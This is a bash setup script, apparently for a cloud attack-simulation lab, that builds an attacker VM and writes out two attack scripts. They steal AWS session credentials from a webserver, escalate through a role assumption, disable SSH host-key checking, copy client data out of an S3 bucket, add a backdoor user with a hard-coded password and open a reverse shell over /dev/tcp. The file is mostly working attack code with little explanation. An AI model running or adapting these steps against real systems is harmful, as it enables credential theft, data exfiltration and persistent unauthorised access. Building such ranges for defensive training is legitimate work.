#!/bin/bash

# Install required packages
sudo apt-get update -y && \
sudo apt-get install -y \
python3 \
python3-pip \
python3-virtualenv \
jq \
curl \
wget \
unzip
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install

# Create the attack script that will be executed through ssh in the Webserver EC2 instance
cat <<EOF  > /home/${admin_username}/test.sh
aws sts get-caller-identity
sudo snap install aws-cli
sudo snap install aws-cli --classic

aws sts get-caller-identity

# curl access keys

export AWS_ACCESS_KEY_ID=\$assume_access_key
export AWS_SECRET_ACCESS_KEY=\$assumed_secret_key
export AWS_SESSION_TOKEN=\$assumed_session_token

aws sts get-caller-identity

# List S3 bucket and exfiltrate sensitive data
bucket="${bucket_name}"
aws s3 ls s3://\$bucket
aws s3 cp s3://\$bucket/client_data .
aws s3 cp s3://\$bucket/client_data.txt .
cat ./client_data.txt

# Create a new user in the RAG instance
useradd -p b@ckd00r! localweb
sudo useradd -p b@ckd00r! localweb

#our EC2 public IP
attacker_machine="${webserver_ip}"
###listen on ec2 for reverse shell
/bin/bash -i >& /dev/tcp/\$attacker_machine/555 0>&1
EOF

cat <<EOF  > /home/azureuser/${attack_script_name} 

# URL of your Flask app
url="http://${webserver_ip}:5000/"

# Retrieve credentials from the Flask app
response=\$(curl -s \$url)
if [ \$? -ne 0 ]; then
  echo "Failed to connect to \$url"
  exit 1
fi

# Parse the response
access_key=\$(echo \$response | jq -r '.AccessKeyId')
secret_key=\$(echo \$response | jq -r '.SecretAccessKey')
session_token=\$(echo \$response | jq -r '.Token')

# Check if credentials are retrieved correctly
if [ -z "\$access_key" ] || [ -z "\$secret_key" ] || [ -z "\$session_token" ]; then
  echo "Failed to retrieve credentials. Response was: \$response"
  exit 1
fi

# Export credentials as environment variables
export AWS_ACCESS_KEY_ID=\$access_key
export AWS_SECRET_ACCESS_KEY=\$secret_key
export AWS_SESSION_TOKEN=\$session_token

# Verify the configuration
aws sts get-caller-identity

# Install venv and ScoutSuite
virtualenv -p python3 venv
# source venv/bin/activate
venv/bin/pip install scoutsuite

# Run ScoutSuite
venv/bin/scout aws --report-dir scoutsuite-report --quiet --force --no-browser

# Notify user about report location
echo "ScoutSuite scan completed. Report is available in the 'scoutsuite-report' directory."

# Assume the new role after ScoutSuite scan
role_arn="${dev_instance_role_arn}"
role_session_name="dev_instance_connect"
assume_role_output=\$(aws sts assume-role --role-arn \$role_arn --role-session-name \$role_session_name)


# Parse the assumed role credentials
assumed_access_key=\$(echo \$assume_role_output | jq -r '.Credentials.AccessKeyId')
assumed_secret_key=\$(echo \$assume_role_output | jq -r '.Credentials.SecretAccessKey')
assumed_session_token=\$(echo \$assume_role_output | jq -r '.Credentials.SessionToken')

# Check if assumed role credentials are retrieved correctly
if [ -z "\$assumed_access_key" ] || [ -z "\$assumed_secret_key" ] || [ -z "\$assumed_session_token" ]; then
  echo "Failed to assume role. Response was: \$assume_role_output"
  exit 1
fi

# Export assumed role credentials as environment variables
export AWS_ACCESS_KEY_ID=\$assumed_access_key
export AWS_SECRET_ACCESS_KEY=\$assumed_secret_key
export AWS_SESSION_TOKEN=\$assumed_session_token

# Verify the configuration with the assumed role
aws sts get-caller-identity

# Modify ssh client config to automatically accecpt new host keys
echo "StrictHostKeyChecking no" >> ~/.ssh/config
chmod 400 /home/.ssh/config

# Generate a new SSH key pair
if [ -f ~/.ssh/attack_key ]; then
  echo "Key already created"
else
  ssh-keygen -C "attack_key" -q -f ~/.ssh/attack_key -t rsa -b 2048 -N ""
fi
pub_key="/home/azureuser/.ssh/attack_key.pub"
priv_key="~/.ssh/attack_key"


EOF

chmod +x /home/${admin_username}/${attack_script_name}